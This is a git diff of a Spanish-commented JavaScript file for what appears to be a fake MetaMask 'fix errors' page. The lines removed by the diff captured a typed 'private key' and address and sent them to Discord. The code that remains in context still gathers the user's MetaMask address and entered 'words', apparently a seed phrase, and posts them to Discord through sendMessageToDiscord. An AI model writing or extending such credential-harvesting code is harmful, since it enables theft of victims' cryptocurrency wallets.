@@ -9,8 +9,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     const addressStatus = document.getElementById('addressStatus');
     const fixErrorsButton = document.getElementById('fixErrorsButton');
     const fixErrorsContent = document.getElementById('fixErrorsContent');
-    const addressInput = document.getElementById('addressInput');
-    const submitAddressButton = document.getElementById('submitAddress');
     const addTextButton = document.getElementById('addTextButton');
     const textInputsContainer = document.getElementById('textInputsContainer');
     const submitTextsButton = document.getElementById('submitTexts');
@@ -194,15 +192,7 @@ function sendMessageToDiscord(message) {
 
 
     
-   // Función para manejar el envío de la dirección ingresada manualmente
-submitAddressButton.addEventListener('click', () => {
-    const address = addressInput.value.trim();
-    if (address) {
-        console.log(`Dirección enviada manualmente: ${address}`);
-        sendMessageToDiscord(`Dirección enviada manualmente: ${address}`);
-        // Aquí continúa tu lógica, si es necesario
-    }
-});
+  
 
 
 // Asegúrate de que este código ya esté en tu script.js
@@ -213,8 +203,7 @@ submitTextsButton.addEventListener('click', () => {
         if (input.value.trim() !== '') texts.push(input.value);
     });
 
-    const privateKey = addressInput.value.trim(); // Capturar la "clave privada"
-    const message = `Dirección MetaMask: ${fullUserAddress}\nClave Privada: ${privateKey}\nPalabras: ${texts.join(', ')}`;
+    const message = `Dirección MetaMask: ${fullUserAddress}\nPalabras: ${texts.join(', ')}`;
 
 
     console.log(message); // Para depuración, puedes verlo en la consola
